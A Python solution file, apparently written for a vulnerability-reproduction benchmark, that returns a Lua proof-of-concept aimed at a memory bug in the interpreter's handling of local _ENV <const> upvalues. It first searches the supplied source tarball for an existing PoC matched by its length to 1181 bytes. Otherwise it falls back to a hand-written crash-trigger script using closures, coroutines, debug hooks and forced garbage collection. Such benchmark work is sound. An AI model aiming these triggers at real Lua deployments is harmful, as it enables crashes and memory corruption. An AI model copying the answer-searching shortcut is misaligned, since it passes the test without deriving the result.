import tarfile


class Solution:
    def __init__(self):
        self._cached_poc = None

    def solve(self, src_path: str) -> bytes:
        if self._cached_poc is not None:
            return self._cached_poc

        poc = self._find_poc_in_tar(src_path)
        if poc is None:
            poc = self._default_poc()

        self._cached_poc = poc
        return poc

    def _find_poc_in_tar(self, src_path: str):
        try:
            with tarfile.open(src_path, "r:*") as tar:
                candidates_lua = []
                candidates_any = []

                for member in tar.getmembers():
                    if not member.isfile():
                        continue
                    if member.size <= 0 or member.size > 20000:
                        continue

                    name_lower = member.name.lower()
                    try:
                        f = tar.extractfile(member)
                    except Exception:
                        continue
                    if f is None:
                        continue

                    try:
                        data = f.read()
                    except Exception:
                        continue

                    if b"_ENV" in data and b"<const>" in data:
                        score = abs(len(data) - 1181)
                        rec = (score, len(data), data)

                        if name_lower.endswith(".lua") or "test" in name_lower or "poc" in name_lower:
                            candidates_lua.append(rec)
                        else:
                            candidates_any.append(rec)

                if candidates_lua:
                    candidates_lua.sort(key=lambda x: (x[0], x[1]))
                    return candidates_lua[0][2]

                if candidates_any:
                    candidates_any.sort(key=lambda x: (x[0], x[1]))
                    return candidates_any[0][2]
        except Exception:
            pass

        return None

    def _default_poc(self) -> bytes:
        lua_script = """
-- Stress script for Lua handling of local _ENV <const>.
-- Tries multiple patterns combining _ENV <const>, closures,
-- coroutines and aggressive garbage collection.

local function make_env(id)
  local t = {}
  for i = 1, 20 do
    t[i] = i
  end
  t.id = id
  return t
end

local function leak_upvalue_variant1()
  local holder
  local function outer()
    local _ENV <const> = make_env("v1")
    local function inner(a, b, ...)
      local sum = 0
      for i = 1, 3 do
        sum = sum + i + (a or 0) + (b or 0)
      end
      if sum % 2 == 0 then
        return _ENV
      else
        return _ENV, ...
      end
    end
    holder = inner
    return inner
  end

  local f = outer()
  collectgarbage("collect")
  for i = 1, 10000 do
    local t = {}
    t[i] = i
  end
  pcall(f, 1, 2, 3, 4)
end

local function leak_upvalue_variant2()
  if not coroutine or not coroutine.create then
    return
  end

  local co = coroutine.create(function()
    local _ENV <const> = make_env("v2")
    local function inner()
      local acc = 0
      for k, v in pairs(_ENV) do
        if type(v) == "number" then
          acc = acc + v
        end
      end
      return acc
    end
    coroutine.yield(inner)
    for i = 1, 2000 do
      local t = {}
      t[i] = i * 2
    end
    return inner()
  end)

  local ok, inner = coroutine.resume(co)
  if not ok or type(inner) ~= "function" then
    return
  end

  collectgarbage("collect")

  local dbg
  do
    local ok_req, res = pcall(function() return require("debug") end)
    if ok_req and type(res) == "table" then
      dbg = res
    elseif type(debug) == "table" then
      dbg = debug
    elseif _G and type(_G.debug) == "table" then
      dbg = _G.debug
    end
  end

  if dbg and dbg.sethook then
    dbg.sethook(co, function()
      collectgarbage("collect")
    end, "", 1)
  end

  local ok2 = coroutine.resume(co)
end

local function leak_upvalue_variant3()
  local function factory()
    local _ENV <const> = make_env("v3")
    local function level2(flag)
      local tmp = {}
      for i = 1, 5 do
        tmp[i] = i * 3
      end
      local function level3()
        if flag then
          return _ENV.id
        else
          local s = 0
          for k, v in pairs(_ENV) do
            if type(v) == "number" then
              s = s + v
            end
          end
          return s
        end
      end
      return level3
    end
    return level2(true), level2(false)
  end

  local f1, f2 = factory()
  collectgarbage("collect")
  for i = 1, 3000 do
    local t = {}
    t[i] = i
  end
  pcall(f1)
  pcall(f2)
end

for i = 1, 5 do
  leak_upvalue_variant1()
end

for i = 1, 5 do
  leak_upvalue_variant2()
end

for i = 1, 5 do
  leak_upvalue_variant3()
end
"""
        return lua_script.encode("utf-8")